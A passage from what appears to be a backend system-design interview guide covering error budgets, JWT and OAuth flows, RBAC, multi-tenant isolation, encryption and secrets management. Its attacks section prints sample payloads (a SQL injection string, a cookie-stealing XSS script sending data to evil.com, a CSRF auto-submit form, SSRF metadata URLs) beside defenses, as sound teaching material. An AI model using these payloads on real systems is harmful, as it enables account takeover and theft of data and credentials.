5. Monitor the monitoring: alert if metrics stop arriving.

**Diagnosing an incident with all three pillars (original Q39, condensed):**
1. **Dashboard:** when did the error rate spike? Which endpoint? Is latency up too?
2. **Traces:** open failing traces — which span errors or is slow?
3. **Logs:** filter by that `trace_id` for the exact exception and context.
4. **Infra metrics:** correlated CPU, memory, GC, DB connection pool exhaustion? Recent deploy?

**Quick revision (section 8)**
- Metrics = what/how much, traces = where, logs = why; link by trace ID.
- Structured JSON logs with correlation IDs; never log secrets.
- Golden signals: latency, traffic, errors, saturation. RED for services, USE for resources.
- Use p95/p99, never averages, for latency.
- W3C `traceparent` propagates context; OpenTelemetry is the standard.
- Alert on user-facing symptoms and SLO burn rate.

---

## 9. SLI, SLO, SLA and Error Budgets

> **Level:** 🟢 Essential

**What are they?**

| Term | Definition | Example |
|---|---|---|
| **SLI** (Service Level Indicator) | The metric you actually measure | Fraction of requests that succeed in < 300 ms: 99.95% this month |
| **SLO** (Service Level Objective) | Your internal target for that SLI | 99.9% of requests succeed in < 300 ms over 30 days |
| **SLA** (Service Level Agreement) | Contractual promise to customers, with penalties | 99.5% availability or service credits |
| **Error Budget** | Allowed unreliability = 1 − SLO | 0.1% of requests may fail ≈ 43.8 min of downtime per 30 days |

**Relationship:** SLA ≤ SLO ≤ what you actually achieve. The SLO is stricter than the SLA so you notice trouble before you owe customers money.

**Error budget math**

| SLO | Downtime per year | Per 30 days | Per week |
|---|---|---|---|
| 99% | 3.65 days | 7.2 hours | 1.68 hours |
| 99.9% | 8.76 hours | 43.8 min | 10.1 min |
| 99.95% | 4.38 hours | 21.9 min | 5 min |
| 99.99% | 52.6 min | 4.38 min | 1 min |
| 99.999% | 5.26 min | 26 s | 6 s |

```
SLO: 99.9% availability
Error Budget: 0.1% ≈ 43.8 minutes of downtime per month

If you've used 35 min of your error budget this month:
  → You have ~8.8 min left
  → Be careful deploying risky changes
  → This week, focus on reliability over features
```

**How error budgets are used:** they turn "reliability vs velocity" into a data-driven agreement. Budget left → ship features and take risks. Budget burned → freeze risky launches, invest in reliability. 100% is the wrong target: it's impossibly expensive, and users can't tell 99.99% from 100% through their own flaky networks.

**Composite availability:** dependencies in series multiply (`0.999 × 0.999 = 0.998`); redundant replicas in parallel combine as `1 − (1 − A)^n` (two 99% replicas → 99.99%, assuming independent failures).

**Interview perspective**
> **Q: How would you ensure 99.99% availability?**
> 99.99% is about 52 minutes of downtime per year, so humans can't be in the recovery loop for most failures. Eliminate single points of failure: multiple stateless instances across at least three AZs behind a load balancer with health checks; a database with automatic failover to a synchronous standby; Redis with Sentinel or Cluster; a CDN for static content. Add timeouts, circuit breakers and graceful degradation so dependency failures don't cascade. Deploy with canaries and instant rollback, because changes cause most outages. Then measure: define SLIs, alert on SLO burn rate, and regularly test failover. If the target were higher or spanned regional outages, I'd go multi-region active-active.

**Common mistakes:** measuring availability only from server-side health checks (users may still be failing); setting SLOs without consulting what users need; having an SLA tighter than your SLO.

---

## 10. Authentication and Authorization

> **Theme:** Authentication = who are you? Authorization = what can you do?

### 10.1 AuthN vs AuthZ

> **Level:** 🟢 Essential

> **Authentication (AuthN):** verifying the identity of a user or system. Answers "Who are you?" → failure returns **401 Unauthorized** (confusingly named; it means *unauthenticated*).
> **Authorization (AuthZ):** deciding what an authenticated identity may do. Answers "What can you do?" → failure returns **403 Forbidden**.

```
User logs in with credentials
    → Authentication: verifies credentials → "You are Alice" ✅

Alice tries to delete a user record
    → Authorization: "Is Alice an ADMIN? Yes." ✅
    → (if she were only a USER) "No." ❌ 403
```

Where it happens in a microservices system: the [API gateway](02_networking_and_communication.md#13-api-gateway-and-bff) usually **authenticates** (validates the token) once at the edge; each service still **authorizes** its own operations ("can this user see *this* order?"), because only the service knows its resources. Never trust the network alone (**zero trust**).

### 10.2 Sessions vs Tokens

> **Level:** 🟢 Essential

**Two ways to remember that a user logged in:**

```mermaid
flowchart TB
    subgraph sess["Server-side sessions - stateful"]
        b1["Browser - cookie sessionId=abc"] --> s1["Any app server"]
        s1 -->|"lookup abc"| store[("Session store - Redis")]
    end
    subgraph tok["Self-contained tokens - JWT"]
        b2["Client - Authorization Bearer JWT"] --> s2["Any app server"]
        s2 -->|"verify signature locally"| key["Public key / secret"]
    end
```

| | Server-side session | JWT (stateless token) |
|---|---|---|
| What the client holds | Opaque random ID in a cookie | Signed token containing claims |
| Server lookup per request | Yes (session store, e.g., Redis) | No — verify signature locally |
| Revocation / logout | Instant: delete the session | Hard: valid until expiry (need short TTL or denylist) |
| Scaling | Needs a shared store (stateless servers + Redis) | Trivial horizontally; great across microservices |
| Size | Tiny cookie | Hundreds of bytes to KBs per request |
| Best for | Classic web apps, need instant revocation | APIs, mobile, service-to-service, federated identity |

**Interview answer:** both are fine; the decision is about **revocation vs lookup cost**. Many real systems combine them: short-lived JWT access tokens plus a server-side, revocable refresh token.

### 10.3 JWT

> **Level:** 🟢 Essential

**What is it?** **JSON Web Token** — a compact, self-contained token that carries **claims** (statements about the user) as JSON, **digitally signed** so anyone with the key can verify it wasn't tampered with — without a database lookup.

**Structure:** three Base64URL-encoded parts separated by dots — `Header.Payload.Signature`.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6IkFETUlOIn0.abc123signature
│────────────────────│──────────────────────────────────────────────│────────────────│
       Header                          Payload                        Signature
```

**Header:**
```json
{ "alg": "RS256", "typ": "JWT", "kid": "2024-06-key" }
```

**Payload (Base64URL encoded — NOT encrypted; anyone can read it):**
```json
{
  "sub": "user-123",
  "name": "Alice",
  "role": "ADMIN",
  "iss": "https://auth.example.com",
  "aud": "orders-api",
  "iat": 1700000000,
  "exp": 1700003600
}
```

**Signature:**
```
HS256: HMACSHA256(base64url(header) + "." + base64url(payload), shared_secret)
RS256: RSA-SHA256 sign(base64url(header) + "." + base64url(payload), private_key)
```

| Algorithm | Key | Who can verify | Use when |
|---|---|---|---|
| **HS256** (symmetric HMAC) | One shared secret signs and verifies | Anyone with the secret — which can also *forge* tokens | Single service that both issues and verifies |
| **RS256 / ES256** (asymmetric) | Private key signs, public key verifies | Anyone with the public key — cannot forge | Many services verify tokens from one auth server (microservices) |

**Authentication flow:**

```mermaid
sequenceDiagram
    participant C as Client
    participant A as Auth Server
    participant API as Resource API
    C->>A: POST /login - username and password
    A->>A: verify credentials - BCrypt check
    A-->>C: access token JWT 15 min + refresh token
    C->>API: GET /orders - Authorization Bearer JWT
    API->>API: verify signature, exp, iss, aud - no DB lookup
    API-->>C: 200 orders for sub user-123
    Note over C,API: later - access token expired
    C->>API: GET /orders - expired JWT
    API-->>C: 401
    C->>A: POST /token/refresh - refresh token
    A->>A: check refresh token not revoked, rotate it
    A-->>C: new access token + new refresh token
```

1. Client sends credentials; server validates them.
2. Server creates a JWT, signs it, and returns it (plus a refresh token).
3. Client stores it (memory, or an `httpOnly` `Secure` cookie for browsers) and sends `Authorization: Bearer <token>` on each request.
4. The API verifies the signature, `exp` (expiry), `iss` (issuer), and `aud` (audience) — no DB call — and reads claims (user ID, roles).

**Access token vs refresh token**

```
Access Token:
  - Short-lived (5–15 min typical, up to 1 hour)
  - Sent with every API request
  - If stolen, limited window of abuse

Refresh Token:
  - Long-lived (days to weeks)
  - Stored securely (httpOnly cookie / secure storage on mobile)
  - Used ONLY to get new access tokens, only sent to the auth server
  - Stored server-side → can be revoked
  - Rotated on every use (reuse of an old one = theft signal → revoke the family)
```

**Pros and cons**

| Pros | Cons |
|---|---|
| Stateless — no session store on the hot path | Cannot be invalidated before expiry without extra machinery |
| Self-contained — claims embedded | Payload is only encoded, not encrypted |
| Works across microservices and domains | Refresh-token handling adds complexity |
| Scales horizontally easily | Larger than a session ID on every request |

**Revocation strategies** (because a JWT is valid until `exp`):
1. **Short expiry** for access tokens (minutes) — the main defense.
2. **Revoke refresh tokens** server-side (logout, password change).
3. **Denylist** of revoked token IDs (`jti` claim) in Redis with TTL = remaining token lifetime — reintroduces a lookup, but only a fast one.
4. **Token version** claim per user, bumped on "log out everywhere"; services compare with a cached value.

**Key rotation (corrected):** prefer **asymmetric signing + a JWKS endpoint**. The auth server publishes its public keys at `/.well-known/jwks.json`, each with a key ID; tokens carry `kid` in the header so verifiers pick the right key.
1. Generate a new key pair and **publish** its public key in JWKS (old key still listed).
2. Wait until verifiers have refreshed their JWKS cache.
3. Start **signing** new tokens with the new key.
4. After the maximum token lifetime passes, **remove** the old public key.

No coordinated deploy, no shared secret to distribute. (The original "dual-secret validation" approach for HS256 works too, but every service must hold the secret, and any of them could forge tokens.)

**Spring Boot JWT example (jjwt 0.11 API):**

```java
// Generate token
String token = Jwts.builder()
    .setSubject(userId)
    .claim("role", user.getRole())
    .setIssuedAt(new Date())
    .setExpiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000))
    .signWith(privateKey, SignatureAlgorithm.RS256)
    .compact();

// Validate token (throws on bad signature or expiry)
Claims claims = Jwts.parserBuilder()
    .setSigningKey(publicKey)
    .requireIssuer("https://auth.example.com")
    .build()
    .parseClaimsJws(token)
    .getBody();
String userId = claims.getSubject();
```

In practice, resource servers rarely parse JWTs by hand — Spring Security does it from config:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.example.com   # discovers the JWKS URL and validates iss/exp
```

**Common mistakes**
- Putting sensitive data in the payload (it's readable by anyone).
- Accepting `alg: none` or letting the token choose the algorithm — always pin the expected algorithm.
- Not validating `aud`/`iss` — a token for another service gets accepted.
- Storing tokens in `localStorage` (readable by any XSS script); prefer `httpOnly` cookies for browsers.
- Long-lived access tokens with no revocation path.

### 10.4 OAuth 2.0

> **Level:** 🟢 Essential

**What is it?** An **authorization framework** that lets a third-party application obtain **limited, delegated access** to a user's resources on another service, **without the user giving that app their password**.

**The problem it solves:**

```
Without OAuth:
  "Give us your Gmail password so we can read your contacts"
  → You hand full credentials to a third party ❌

With OAuth:
  "Allow this app to read your contacts only"
  → You grant a limited scope; the app never sees your password ✅
```

**Roles**

| Role | Description |
|---|---|
| **Resource Owner** | The user who owns the data |
| **Client** | The app requesting access (your web/mobile app) |
| **Authorization Server** | Authenticates the user, gets consent, issues tokens (Google, GitHub, Auth0, Keycloak, Okta) |
| **Resource Server** | The API holding the data; validates access tokens |

**Authorization Code flow (with PKCE) — the standard for web, mobile, and SPAs**

```mermaid
sequenceDiagram
    participant U as User Browser
    participant App as Client App Server
    participant AS as Authorization Server
    participant RS as Resource Server API
    U->>App: click Login with Google
    App->>App: create code_verifier and code_challenge = SHA256 of verifier
    App-->>U: redirect to AS /authorize with client_id, redirect_uri, scope, state, code_challenge
    U->>AS: login and grant consent
    AS-->>U: redirect to redirect_uri with code and state
    U->>App: GET /callback with code and state
    App->>App: check state matches - CSRF protection
    App->>AS: POST /token with code, code_verifier, client credentials
    AS->>AS: verify SHA256 of verifier equals stored challenge
    AS-->>App: access_token, refresh_token, id_token
    App->>RS: GET /userinfo - Bearer access_token
    RS-->>App: profile data
```

Original step-by-step version:

```
1. User clicks "Login with Google" in your app
2. App redirects to Google:
   https://accounts.google.com/o/oauth2/v2/auth
   ?client_id=your-app-id
   &redirect_uri=https://yourapp.com/callback
   &scope=openid%20email%20profile
   &response_type=code
   &state=random-csrf-value
   &code_challenge=...&code_challenge_method=S256
3. User logs into Google and grants consent
4. Google redirects back: https://yourapp.com/callback?code=AUTH_CODE_XYZ&state=...
5. Your server exchanges the code for tokens (server-to-server):
   POST https://oauth2.googleapis.com/token
   { code, client_id, client_secret, redirect_uri, code_verifier }
6. Google returns { access_token, refresh_token, id_token, expires_in }
7. Your app calls the API with: Authorization: Bearer ACCESS_TOKEN
8. Google returns the user's profile data
```

**Why the code exchange (step 5)?** The authorization code is short-lived and single-use, and it travels through the browser. The actual tokens are obtained in a back-channel call, so they never appear in browser history, logs, or referrer headers.

**PKCE (Proof Key for Code Exchange)** — for clients that can't keep a `client_secret` (mobile apps, SPAs), and now recommended for all clients:

```
1. App generates a random code_verifier
2. App computes code_challenge = BASE64URL(SHA256(code_verifier))
3. App sends code_challenge with the authorize request
4. Auth server stores code_challenge
5. App exchanges code + code_verifier (no client_secret needed)
6. Auth server verifies SHA256(code_verifier) == stored code_challenge ✅
```

An attacker who intercepts the code can't redeem it without the verifier, which never left the app.

**Other grant types**

| Grant | Use for | Notes |
|---|---|---|
| Authorization Code + PKCE | Users logging in via browser/mobile | The default |
| Client Credentials | Service-to-service, no user involved | Client authenticates with its own credentials |
| Device Code | TVs, CLIs without a browser | User approves on another device |
| Refresh Token | Getting new access tokens | Rotate on use |
| ~~Implicit~~, ~~Password~~ | Legacy | Deprecated by OAuth 2.1 / security best practice |

### 10.5 OpenID Connect and SSO

> **Level:** 🟡 Intermediate

- **OAuth 2.0** is about **authorization** ("this app may read your contacts"). Its access token tells an API what is allowed, not reliably *who* the user is.
- **OpenID Connect (OIDC)** is an identity layer **on top of** OAuth 2.0 for **authentication**. Add `scope=openid` and you also receive an **ID token** (a JWT with `sub`, `email`, `name`, `iss`, `aud`) plus a standard `/userinfo` endpoint and discovery document (`/.well-known/openid-configuration`).
- **SSO (Single Sign-On):** log in once at an identity provider (Okta, Azure AD/Entra ID, Keycloak, Google) and access many apps without logging in again — implemented with OIDC or the older XML-based **SAML** (common in enterprises).

> **Interview line:** "Use OIDC for 'Login with X' (authentication); use OAuth scopes and access tokens to call APIs (authorization). The ID token is for the client app; the access token is for the API."

### 10.6 RBAC and ABAC

> **Level:** 🟢 Essential

**What is RBAC?** **Role-Based Access Control**: permissions are assigned to **roles**, and users are assigned roles. Users inherit the permissions of their roles.

```mermaid
flowchart LR
    alice["Alice"] --> admin["Role ADMIN"]
    bob["Bob"] --> editor["Role EDITOR"]
    carol["Carol"] --> viewer["Role VIEWER"]
    admin --> p1["read:users"]
    admin --> p2["write:users"]
    admin --> p3["delete:users"]
    editor --> p1
    editor --> p2
    viewer --> p1
```

```
Permission: read:invoice (action on resource)
Role:       ACCOUNTANT = [read:invoice, create:invoice]
User:       Alice = [ACCOUNTANT, VIEWER]
```

**Spring Boot RBAC example:**

```java
// Method-level authorization (requires @EnableMethodSecurity)
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
public void deleteUser(@PathVariable String id) { ... }

@PreAuthorize("hasAnyRole('ADMIN', 'EDITOR')")
@PutMapping("/users/{id}")
public void updateUser(@PathVariable String id, @RequestBody UserDTO dto) { ... }

// Ownership check — a step toward ABAC
@PreAuthorize("#userId == authentication.name or hasRole('ADMIN')")
@GetMapping("/users/{userId}/orders")
public List<OrderDTO> orders(@PathVariable String userId) { ... }

// URL-level security config
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")
    .requestMatchers("/api/**").hasAnyRole("ADMIN", "USER")
    .requestMatchers("/public/**").permitAll()
    .anyRequest().authenticated()
);
```

**RBAC vs ABAC**

| Feature | RBAC | ABAC (Attribute-Based) |
|---|---|---|
| Based on | Roles | Attributes of user, resource, action, environment |
| Example | "Only ADMINs can delete" | "Users can edit only their own posts, before 5 pm, from the office network" |
| Complexity | Simple | More complex, very expressive |
| Flexibility | Lower — "role explosion" as rules grow | Higher |
| Use when | Clear role hierarchy | Fine-grained, context-dependent access |

Related: **ReBAC** (relationship-based, e.g., Google Zanzibar / OpenFGA: "can view if member of the folder's team") for sharing-heavy apps like Google Drive. Policy engines like **OPA** (Open Policy Agent) centralize rules as code.

**Common mistake:** checking roles only (RBAC) and forgetting **object-level** checks — "user is a CUSTOMER" doesn't mean they may read order 123. Missing object-level authorization (IDOR / BOLA) is the #1 API security risk in OWASP's API Top 10.

### 10.7 Multi-Tenant Authentication

> **Level:** 🟡 Intermediate

**What is it?** **Multi-tenancy** means one software deployment serves many customers (**tenants**) with strict isolation of their data, configuration, and users.

**Tenant isolation models**

| Model | How | Isolation | Cost | Notes |
|---|---|---|---|---|
| **Separate DB per tenant** | Each tenant has its own database | Strongest | Highest | Easy per-tenant backup/restore; hard to run thousands |
| **Separate schema per tenant** | One DB, schema per tenant | Strong | Medium | Migrations run N times |
| **Shared DB, `tenant_id` column** | One schema, every row tagged | Weakest (logical) | Lowest | Scales to many small tenants; one bug can leak data |

Hybrid is common: shared tables for small tenants, dedicated DBs for large "enterprise" tenants (also solves the **noisy neighbor** problem).

**JWT with a tenant claim:**

```json
{
  "sub": "user-123",
  "tenant_id": "acme-corp",
  "role": "ADMIN",
  "exp": 1700003600
}
```

Every request carries the tenant context; every data access filters by it:

```java
// Tenant id extracted from the verified JWT into a request-scoped holder
@Repository
public class OrderRepository {
    public List<Order> findOrders() {
        String tenantId = TenantContext.getCurrentTenant();
        return em.createQuery(
            "SELECT o FROM Order o WHERE o.tenantId = :tid", Order.class)
            .setParameter("tid", tenantId)
            .getResultList();
    }
}
```

**Defense in depth — let the database enforce it too (PostgreSQL Row-Level Security):**

```sql
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON orders
    USING (tenant_id = current_setting('app.tenant_id'));

-- the app sets this per transaction from the verified JWT:
SET LOCAL app.tenant_id = 'acme-corp';
```

Now even a query that forgets `WHERE tenant_id = ?` returns only the current tenant's rows. (Hibernate's `@TenantId` / filters provide a similar guard at the ORM level.)

**Tenant resolution strategies:** subdomain (`acme.yourapp.com`), path (`/api/acme/orders`), header (`X-Tenant-ID` — only trust it if verified against the token), or JWT claim (most secure, because it's signed).

**Interview perspective**
> **Q: How would you secure a multi-tenant API so tenants never see each other's data?**
> Layers: (1) a signed JWT carries `tenant_id`, so clients can't forge it; (2) a filter extracts it into a request-scoped tenant context; (3) every query is tenant-filtered at the repository layer, never left to individual developers; (4) PostgreSQL row-level security as a safety net; (5) tenant ID included in cache keys, object storage prefixes, and search indexes too; (6) automated tests that try cross-tenant access and expect 403/404. For large tenants with strict compliance needs I'd offer a dedicated database.

### 10.8 Service-to-Service Authentication

> **Level:** 🟡 Intermediate

Internal calls need identity too ("zero trust": being inside the network proves nothing).

| Approach | How | Notes |
|---|---|---|
| **mTLS** | Both sides present certificates; identity = certificate (e.g., SPIFFE ID) | Usually automated by a service mesh; details in [TLS and mTLS](02_networking_and_communication.md#5-tls-and-mtls) |
| **OAuth 2.0 Client Credentials** | Service gets its own access token from the auth server | Works across organizations and clouds |
| **Workload identity** | Platform-issued identity (Kubernetes service account tokens, AWS IAM roles for pods, GCP Workload Identity) | No long-lived secrets to manage |
| **Token propagation / exchange** | Forward the user's token, or exchange it for a narrower downstream token | Keeps the *user* context for authorization decisions |

**Quick revision (section 10)**
- 401 = not authenticated; 403 = authenticated but not allowed.
- Sessions: easy revocation; JWT: no lookup, hard revocation → short TTL + refresh tokens.
- Sign JWTs with RS256/ES256 and rotate keys through JWKS + `kid`.
- OAuth 2.0 = delegated authorization; OIDC = authentication on top; use Authorization Code + PKCE.
- RBAC for roles, plus object-level checks; ABAC/ReBAC for fine-grained rules.
- Multi-tenancy: tenant from the signed token, filtered everywhere, enforced by RLS.

---

## 11. Security Fundamentals

> **Theme:** Security is not a feature you add at the end. It is designed in from the start.

### 11.1 Security Principles

> **Level:** 🟢 Essential

| Principle | Meaning | Example |
|---|---|---|
| **Defense in depth** | Multiple independent layers, so one failure isn't a breach | WAF + gateway auth + service authZ + DB row-level security + encryption |
| **Least privilege** | Every user/service gets only the permissions it needs | Order service's DB user can't `DROP TABLE`; IAM role can read one S3 prefix |
| **Zero trust** | Never trust based on network location; authenticate every call | mTLS between services, even inside the VPC |
| **Secure by default** | Safe settings out of the box | Buckets private by default; deny-all firewall rules |
| **Minimize attack surface** | Fewer exposed endpoints, ports, dependencies | Private subnets for DBs; remove unused admin endpoints |
| **Audit everything sensitive** | Who did what, when | Immutable audit logs for admin actions and data access |

The **OWASP Top 10** (web) and **OWASP API Security Top 10** are the standard checklists of the most common vulnerabilities (broken access control, injection, cryptographic failures, SSRF, security misconfiguration, and so on). Mentioning them shows you know where to look.

```mermaid
flowchart LR
    user["Client"] --> cdn["CDN + WAF + DDoS protection"]
    cdn --> gw["API Gateway - TLS, authN, rate limit"]
    gw --> svc["Service - authZ, input validation"]
    svc --> db[("DB - least privilege user, RLS, encryption at rest")]
    svc --> vault["Secrets manager"]
    svc --> audit[("Audit log")]
```

### 11.2 Encryption

> **Level:** 🟢 Essential

**What is it?** Converting plaintext into unreadable **ciphertext** using an algorithm and a key, so only parties with the right key can read it.

**Symmetric vs asymmetric**

| Type | How | Key | Speed | Use Case |
|---|---|---|---|---|
| **Symmetric** (AES-256-GCM) | Same key encrypts and decrypts | One shared key | Fast | Bulk data at rest, the session data inside TLS |
| **Asymmetric** (RSA, ECC) | Public key encrypts / verifies; private key decrypts / signs | Key pair | Slow | Key exchange, digital signatures (JWT RS256), certificates |

```
Symmetric (AES-256):
  encrypt("Hello", key) → "X7f#9@"
  decrypt("X7f#9@", key) → "Hello"
  ✅ Fast  ❌ Both parties need the same key (key distribution problem)

Asymmetric (RSA):
  encrypt("Hello", publicKey) → "X7f#9@"
  decrypt("X7f#9@", privateKey) → "Hello"
  ✅ No shared secret to distribute  ❌ Slow (used for small data / keys only)
```

TLS uses both: asymmetric cryptography to authenticate the server and agree on a key, then fast symmetric encryption for the data. Handshake details: [TLS and mTLS](02_networking_and_communication.md#5-tls-and-mtls).

**Encryption in transit:** protects data moving across a network. Use TLS everywhere — external *and* internal traffic; minimum TLS 1.2, prefer 1.3; HSTS for browsers.

**Encryption at rest:** protects stored data (disks, databases, backups, object storage) against stolen disks, leaked snapshots, or unauthorized storage access.

```
Disk/DB level:  managed encryption (AWS RDS/EBS encryption, Transparent Data Encryption)
Object storage: S3 SSE-S3 or SSE-KMS (server-side encryption)
App level:      encrypt specific fields before storing (card numbers, national IDs, health data)
```

Disk-level encryption doesn't protect against someone who can *query* the database — that's why highly sensitive fields also get application-level encryption or **tokenization** (store a token, keep the real value in a separate vault — common for PCI card data).

**KMS and envelope encryption** 🔴

A **KMS** (Key Management Service: AWS KMS, GCP KMS, HashiCorp Vault Transit, HSMs) stores master keys that **never leave it**. To encrypt large data efficiently, use **envelope encryption**:

```mermaid
flowchart LR
    app["Application"] -->|"1 request data key"| kms["KMS - master key never leaves"]
    kms -->|"2 plaintext data key + encrypted data key"| app
    app -->|"3 encrypt data locally with AES"| blob[("Store ciphertext + encrypted data key")]
    app -.->|"4 discard plaintext data key"| gone["memory wiped"]
```

1. Ask KMS for a **data key**; it returns the key in plaintext and encrypted under the master key.
2. Encrypt the data locally with the plaintext data key (fast AES), then throw the plaintext key away.
3. Store the ciphertext together with the *encrypted* data key.
4. To decrypt: send the encrypted data key to KMS (access-controlled and audited), get it back in plaintext, decrypt locally.

Benefits: master keys are never exposed, every decryption is authorized and logged, and rotating the master key doesn't require re-encrypting all the data.

### 11.3 Password Hashing

> **Level:** 🟢 Essential

**Hashing is not encryption:** it's one-way — you can't reverse it. You store the hash and compare hashes at login.

```java
// NEVER store plain passwords
// NEVER use MD5, SHA-1, or plain SHA-256 for passwords (too fast → billions of guesses/sec on GPUs)

// Use BCrypt, Argon2id, or scrypt (slow, salted, tunable):
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
boolean valid = BCrypt.checkpw(inputPassword, storedHash);

// Spring Security
PasswordEncoder encoder = PasswordEncoderFactories.createDelegatingPasswordEncoder(); // bcrypt by default
String stored = encoder.encode(rawPassword);              // "{bcrypt}$2a$10$..."
boolean ok = encoder.matches(rawPassword, stored);
```

- **Salt:** a random value per password stored with the hash, so identical passwords produce different hashes and precomputed rainbow tables are useless.
- **Work factor:** BCrypt cost 12 ≈ ~250 ms per hash (varies by hardware) — negligible for one login, prohibitive for an attacker trying billions.
- **Pepper (optional):** a secret added to every password, stored outside the DB (e.g., in KMS), so a DB-only leak isn't enough.
- Also: rate-limit login attempts, support MFA, check passwords against breached-password lists.

### 11.4 Secrets Management

> **Level:** 🟢 Essential

**What is it?** Securely storing, distributing, rotating, and auditing sensitive values — API keys, DB passwords, signing keys, TLS certificates — so they're never hardcoded or exposed in plaintext.

**The problem (corrected nuance):**

```
# ❌ BAD — hardcoded in code
String dbPassword = "MyDB@secret123";

# ❌ BAD — plaintext in application.properties committed to git
spring.datasource.password=MyDB@secret123

# ⚠️ RISKY — long-lived secret typed into a shell profile or baked into a Docker image
export DB_PASSWORD=MyDB@secret123

# ✅ OK — env var or mounted file INJECTED AT RUNTIME by the platform from a secrets manager
#         (Kubernetes Secret from External Secrets / Vault agent / ECS task secrets)
# ✅ BEST — short-lived, dynamic credentials issued per service (Vault database engine, IAM auth)
```

Environment variables themselves aren't the problem — the original notes called them "BAD". What's bad is **plaintext secrets committed to git, baked into images, or never rotated**. Injecting secrets at runtime from a secrets manager is standard practice; the caveat is that env vars can leak via crash dumps, `/proc`, or debug endpoints, so mounted files or direct SDK fetches are slightly safer. Once a secret is in a git history, consider it leaked — rotate it; deleting the commit isn't enough.

**Secrets management tools**

| Tool | Type | How It Works |
|---|---|---|
| **HashiCorp Vault** | Self-hosted / managed | Central store; **dynamic secrets** (generates a DB user on demand with a TTL); leasing, revocation, audit log |
| **AWS Secrets Manager** | Managed | Store secrets, automatic rotation, IAM-based access |
| **AWS SSM Parameter Store** | Managed | Simpler and cheaper; good for config plus secure strings |
| **GCP Secret Manager / Azure Key Vault** | Managed | Equivalent cloud offerings |
| **Kubernetes Secrets** | Built-in | Only Base64-encoded by default — enable etcd encryption at rest and RBAC; often synced from Vault/cloud via External Secrets Operator |

**Spring Boot + AWS Secrets Manager:**

```yaml
# Spring Cloud AWS reads the secret at startup — no password in code or config
spring:
  config:
    import: "aws-secretsmanager:/myapp/prod/db"
```

**Rotation:** rotate periodically and immediately after a suspected leak. For zero-downtime rotation, keep two valid credentials during a window (create new → deploy apps using new → revoke old). Better still, use dynamic short-lived credentials so rotation happens automatically. Add secret scanning (git hooks, GitHub secret scanning, gitleaks) to CI.

### 11.5 Common Attacks and Defenses

> **Level:** 🟢 Essential

#### SQL Injection

**What:** malicious SQL inserted through input fields makes the database execute unintended commands.

```java
// ❌ VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";
// Input: ' OR '1'='1
// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns ALL users ❌

// ✅ SAFE — parameterized query
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
```

**Defense:** always use parameterized queries / prepared statements — the database treats parameters as data, never as SQL. JPA/Hibernate parameter binding does this, but native queries built by string concatenation are still vulnerable. Plus least-privilege DB users and input validation.

#### XSS — Cross-Site Scripting

**What:** malicious scripts injected into pages viewed by other users, stealing cookies/tokens or acting on their behalf.

```html
<!-- ❌ Stored XSS: user submits this as a comment -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>
<!-- When rendered for other users, the script runs and steals their cookies -->
```

**Defenses:** encode/escape all user-supplied output for its context (HTML, attribute, JS, URL); use frameworks that auto-escape (React, Thymeleaf); sanitize rich HTML with an allowlist library; **Content Security Policy** headers; `httpOnly` cookies so scripts can't read session cookies.

#### CSRF — Cross-Site Request Forgery

**What:** tricks a logged-in user's browser into sending an unwanted request to a site where they're authenticated — browsers automatically attach that site's cookies.

```
1. User is logged into bank.com (session cookie exists)
2. User visits evil.com
3. evil.com has a hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser sends the POST to bank.com WITH the session cookie
5. Bank thinks this is a legitimate request ❌
```

**Defenses:** CSRF tokens (unique per session, submitted with every state-changing request — Spring Security enables this by default for sessions); `SameSite=Lax` (modern browser default) or `SameSite=Strict` cookies, which stop the browser from attaching the cookie on cross-site requests; checking `Origin`/`Referer`; never changing state on GET. APIs using `Authorization: Bearer` headers (not cookies) aren't vulnerable to classic CSRF because browsers don't attach those headers automatically.

#### SSRF — Server-Side Request Forgery

**What:** the attacker makes **your server** fetch a URL of their choice — often internal services or cloud metadata endpoints that are unreachable from the internet.

```
Attacker submits to a "fetch URL preview" feature:
  http://internal-admin.company.local/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

Server fetches it and returns the result
→ Attacker reads internal services or cloud credentials ❌
```

**Defenses:** allowlist destinations where possible; resolve the hostname and **block private/link-local ranges** (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, IPv6 equivalents) — and re-check after redirects and against DNS rebinding; run fetchers in an isolated network segment with no internal access; require IMDSv2 on AWS (session-token-based metadata access).

#### DDoS — Distributed Denial of Service

**What:** overwhelming a service with traffic from many sources (often a botnet) so legitimate users can't get through. Volumetric (flood bandwidth), protocol (SYN floods), or application-layer (expensive HTTP requests like search).

**Defenses:** CDN and DDoS protection at the edge (Cloudflare, AWS Shield, Google Cloud Armor), anycast to spread attack traffic; WAF rules; [rate limiting](02_networking_and_communication.md#14-rate-limiting) per IP, user, and API key; autoscaling to absorb spikes (with cost limits); CAPTCHA or proof-of-work for high-risk endpoints; IP reputation, geo-blocking; caching so expensive endpoints aren't hit directly.

#### Other attacks worth naming

| Attack | One-line defense |
|---|---|
| Broken object-level authorization (IDOR) | Check ownership of every resource ID on the server |
| Credential stuffing | Rate-limit logins, MFA, breached-password checks, bot detection |
| Man-in-the-middle | TLS everywhere, HSTS, certificate validation (never disable it in clients) |
| Insecure deserialization | Don't deserialize untrusted data into arbitrary types; use allowlists |
| Supply-chain (malicious dependency) | Pin versions, dependency scanning (Dependabot, Snyk), SBOMs, signed artifacts |
| Mass assignment | Bind requests to explicit DTOs, never directly to entities |

### 11.6 Security Headers

> **Level:** 🟡 Intermediate

```http
# Limit where scripts and resources can load from (mitigates XSS)
